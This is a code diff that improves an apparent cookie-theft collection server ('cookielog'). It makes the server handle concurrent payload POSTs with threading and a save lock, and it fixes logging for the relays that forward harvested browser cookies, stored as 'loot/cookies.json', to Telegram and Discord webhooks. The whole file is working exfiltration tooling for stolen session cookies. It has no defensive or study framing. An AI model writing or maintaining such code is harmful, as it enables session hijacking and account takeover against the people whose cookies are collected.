@@ -20,7 +20,7 @@ Relay options (re-send received cookies to a second channel):
   --discord <webhook_url>            Forward summary to Discord webhook
   --email <addr>                     (future) Forward via email
 """
-import json, os, sys, time, socket, socketserver, urllib.request, urllib.parse
+import json, os, sys, time, socket, socketserver, threading, urllib.request, urllib.parse
 from http.server import HTTPServer, BaseHTTPRequestHandler
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
@@ -60,9 +60,12 @@ while i < len(args):
         i += 1
 
 
-class HTTPServerV4(HTTPServer):
-    """Force IPv4 — HTTPServer default may resolve 0.0.0.0 to IPv6 on Windows."""
+class HTTPServerV4(socketserver.ThreadingMixIn, HTTPServer):
+    """Force IPv4 — HTTPServer default may resolve 0.0.0.0 to IPv6 on Windows.
+    ThreadingMixIn: the Telegram/Discord relay runs inside do_POST and can block
+    for 10s; a single-threaded server stalled concurrent payload POSTs."""
     address_family = socket.AF_INET
+    daemon_threads = True
 
     def server_bind(self):
         """Override to skip socket.getfqdn() — it does a reverse DNS lookup on the
@@ -119,7 +122,7 @@ def relay_telegram(cookies):
             d = c.get("domain", "?")
             domains[d] = domains.get(d, 0) + 1
         top = sorted(domains.items(), key=lambda kv: -kv[1])[:15]
-        msg = "🍪 cookielog: %d cookies received\n\nTop domains:\n" % len(cookies)
+        msg = "cookielog: %d cookies received\n\nTop domains:\n" % len(cookies)
         for d, n in top:
             msg += "  %4d  %s\n" % (n, d)
         msg += "\nFull JSON: loot/cookies.json"
@@ -159,6 +162,8 @@ def relay_discord(cookies):
     except Exception as ex:
         print("[-] discord relay failed: %s" % ex)
 
+
+SAVE_LOCK = threading.Lock()
 
 def write_json(rows):
     with open(JSONF, "w", encoding="utf-8") as f:
@@ -255,6 +260,10 @@ class Handler(BaseHTTPRequestHandler):
             self.wfile.write(data)
 
     def do_POST(self):
+        with SAVE_LOCK:
+            self._do_post_locked()
+
+    def _do_post_locked(self):
         length = int(self.headers.get("Content-Length", 0))
         body = self.rfile.read(length) if length > 0 else b"[]"
         try:
@@ -348,7 +357,7 @@ def main():
     if TELEGRAM:
         print("[listen] relay: Telegram -> %s" % TELEGRAM.split(":")[0][:10] + "...")
     if DISCORD:
-        print("[listen] relay: Discord -> %s" % DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30])
+        print("[listen] relay: Discord -> %s" % (DISCORD.split("/api/")[0] if "/api/" in DISCORD else DISCORD[:30]))
     server = HTTPServerV4(("0.0.0.0", PORT), Handler)
     try:
         server.serve_forever()
